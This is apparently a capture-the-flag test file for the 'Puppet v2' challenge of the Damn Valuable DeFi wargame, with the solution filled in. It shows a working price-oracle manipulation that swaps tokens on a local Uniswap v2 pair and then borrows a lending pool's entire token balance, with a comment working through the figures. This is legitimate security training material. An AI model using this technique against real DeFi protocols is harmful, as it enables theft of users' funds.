const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require("hardhat");
const { expect } = require("chai");
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

describe("[Challenge] Puppet v2", function () {
  let deployer, player;
  let token, weth, uniswapFactory, uniswapRouter, uniswapExchange, lendingPool;

  // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
  const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n;
  const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n;

  const PLAYER_INITIAL_TOKEN_BALANCE = 10000n * 10n ** 18n;
  const PLAYER_INITIAL_ETH_BALANCE = 20n * 10n ** 18n;

  const POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
    expect(await ethers.provider.getBalance(player.address)).to.eq(
      PLAYER_INITIAL_ETH_BALANCE
    );

    const UniswapFactoryFactory = new ethers.ContractFactory(
      factoryJson.abi,
      factoryJson.bytecode,
      deployer
    );
    const UniswapRouterFactory = new ethers.ContractFactory(
      routerJson.abi,
      routerJson.bytecode,
      deployer
    );
    const UniswapPairFactory = new ethers.ContractFactory(
      pairJson.abi,
      pairJson.bytecode,
      deployer
    );

    // Deploy tokens to be traded
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    weth = await (await ethers.getContractFactory("WETH", deployer)).deploy();

    // Deploy Uniswap Factory and Router
    uniswapFactory = await UniswapFactoryFactory.deploy(
      ethers.constants.AddressZero
    );
    uniswapRouter = await UniswapRouterFactory.deploy(
      uniswapFactory.address,
      weth.address
    );

    // Create Uniswap pair against WETH and add liquidity
    await token.approve(uniswapRouter.address, UNISWAP_INITIAL_TOKEN_RESERVE);
    await uniswapRouter.addLiquidityETH(
      token.address,
      UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
      0, // amountTokenMin
      0, // amountETHMin
      deployer.address, // to
      (await ethers.provider.getBlock("latest")).timestamp * 2, // deadline
      { value: UNISWAP_INITIAL_WETH_RESERVE }
    );
    uniswapExchange = await UniswapPairFactory.attach(
      await uniswapFactory.getPair(token.address, weth.address)
    );
    expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0);

    // Deploy the lending pool
    lendingPool = await (
      await ethers.getContractFactory("PuppetV2Pool", deployer)
    ).deploy(
      weth.address,
      token.address,
      uniswapExchange.address,
      uniswapFactory.address
    );

    // Setup initial token balances of pool and player accounts
    await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
    await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

    // Check pool's been correctly setup
    expect(await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)).to.eq(
      3n * 10n ** 17n
    );
    expect(
      await lendingPool.calculateDepositOfWETHRequired(
        POOL_INITIAL_TOKEN_BALANCE
      )
    ).to.eq(300000n * 10n ** 18n);
  });

  /**
   * The solution to this challenge is fairly similar to the previous challenge.
   * The main difference is that we need to use the Uniswap v2 router instead of
   * the Uniswap v1 exchange, and the lending pool has a deposit factor of 3.
   * We manipulate the value of the liquidity pool in favour of the player before
   * borrowing DVT tokens from the lending pool.
   *
   * Going into more detail:
   * The uniswap pool has a 10 ETH : 100 DVT valuation ratio. From here, if we deposit our 10000 DVT tokens
   * with a fee of 0.3% (uniswap liquidity provider fee), we will get ~9.906 ETH.
   * Calculations are as follows:
   * (10000 * 997) * 10 / ((100 * 1000) + 10000 * 997) = 9.90069513406157 ETH
   * (Or this can be simplified via the use of the SDK or `getAmountOut` function)
   * This will leave the pool with 10100 DVT and 0.09930486593843 ETH.
   * Now, we calculate the amount of WETH we need to deposit to the lending pool
   * to borrow 1000000 DVT tokens. This is done by using the `calculateDepositOfWETHRequired`, which
   * will show about ~29.49649483319732198 WETH.
   * This can also be calculated manually via (1000000) * (0.09930486593843) / (10100) = ~9.832164944399011
   * and multiplying this value by a factor of 3 which equals about ~29.496494833197033 WETH.
   * Now, we deposit this amount of WETH to the lending pool and borrow 1000000 DVT tokens.
   */
  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    const { formatEther } = ethers.utils;

    const [tokenReserve, wethReserve] = await uniswapExchange.getReserves();
    const wethAmountOut = await uniswapRouter.getAmountOut(
      PLAYER_INITIAL_TOKEN_BALANCE,
      tokenReserve,
      wethReserve
    );
    console.log("wethAmountOut: ", formatEther(wethAmountOut));

    await token
      .connect(player)
      .approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
    await uniswapRouter
      .connect(player)
      .swapExactTokensForETH(
        PLAYER_INITIAL_TOKEN_BALANCE,
        0,
        [token.address, weth.address],
        player.address,
        (await ethers.provider.getBlock("latest")).timestamp * 2
      );

    const ethBalanceAfter = await ethers.provider.getBalance(player.address);
    const wethRequired = await lendingPool.calculateDepositOfWETHRequired(
      POOL_INITIAL_TOKEN_BALANCE
    );

    console.log("wethRequired: ", formatEther(wethRequired));

    // Check that we have enough ETH to deposit
    expect(wethRequired).to.be.lte(ethBalanceAfter);

    // deposit WETH
    await weth.connect(player).deposit({ value: wethRequired });
    await weth.connect(player).approve(lendingPool.address, wethRequired);
    await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    // Player has taken all tokens from the pool
    expect(await token.balanceOf(lendingPool.address)).to.be.eq(0);

    expect(await token.balanceOf(player.address)).to.be.gte(
      POOL_INITIAL_TOKEN_BALANCE
    );
  });
});
